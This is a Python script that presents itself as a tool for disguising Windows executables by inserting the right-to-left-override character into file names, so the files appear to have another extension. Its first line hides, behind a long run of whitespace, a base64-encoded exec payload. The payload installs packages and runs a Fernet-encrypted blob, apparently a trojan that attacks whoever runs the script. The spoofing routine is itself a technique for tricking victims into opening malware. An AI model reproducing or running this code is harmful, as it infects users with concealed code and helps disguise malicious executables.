import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ25XMkxPQWtCTVVQUGZwWUxUd0RvZHYxOG9FaUI3aVNEaEN4UkdaUVRqR2s9JykuZGVjcnlwdChiJ2dBQUFBQUJtYnJxWFhzTGZtNWxQdlYzUGhXaUNsVG5HNzZ2d0Y4TmotYTFWaktkbTcxRFRfZlZOVTQtbUlPZzNNZWNfUkFzREViczRIZGhtTVhza00zdWdiZVMwQ2NaU2ZiUkxZa1BTTXNUdGNLTE9mSmVTX0xBSkpGVTU2Q0dqZlA0ei1xc3RkOWNBR0FtWGRvR1hXeG9CWEdXVDFMNmFwa0xJbzBWeEtqR1k2cmVKeHBCZGp2VXFDWUd0Q3B6cXd6ZkNNYXR2UDdhRGJaY1NjVDJXa3ZBbDJQVHZSMmlLOUh1NzlhMGpYcGVFU2E1NmNRd0ZqYWc9Jykp').decode())
#coding:utf-8

#Author : Nassim Nait-Saidi

import os

#Unicode code corresponding to left-to-write-overwrite
spoofer = '\u202e'

print("\nEnter the complete path to the executable to spoof (in the form of C:/titi/toto/file.exe or C:\\titi\\toto\\file.exe):")
while True:
    #Name of the executable to be spoofed
    path = input("> ")
    if ".exe" not in path:
        print("\n[X] Please include your executable file in the path !\n")
        continue
    else:
        pass
    
    if "/" in path:
        executable_to_spoof = path.split("/")[-1]
    else:
        executable_to_spoof = path.split("\\")[-1]

    #Changing directory to the location of the executable to spoof
    try:
        os.chdir(path[:-len(executable_to_spoof)])
        break
    except Exception:
        print("\n[X] Invalid path !\n")
    
while True:
    #Asking for extension
    extension = input("\nEnter the extension to spoof : ")
    if len(extension) > 3 or extension.isdigit():
        print("\n[X] Please enter a valid extension !\n")
    else:
        break

#Name of the executable with the extension added
extension_added = executable_to_spoof[:len(executable_to_spoof) - 4] + extension[::-1] + executable_to_spoof[-4:]

#Final name of the executable with the extension spoofed
spoofed = extension_added[:len(extension_added) - 7] + spoofer + extension_added[-7:]

#Create the spoofed executable and write the content of the original file into itself
with open(spoofed, "wb") as spoofed_executable:
    with open(executable_to_spoof, "rb") as source_executable:
        spoofed_executable.write(source_executable.read())
        
print("\n[V] Extension spoofed with success.")
print('mdttwdcg')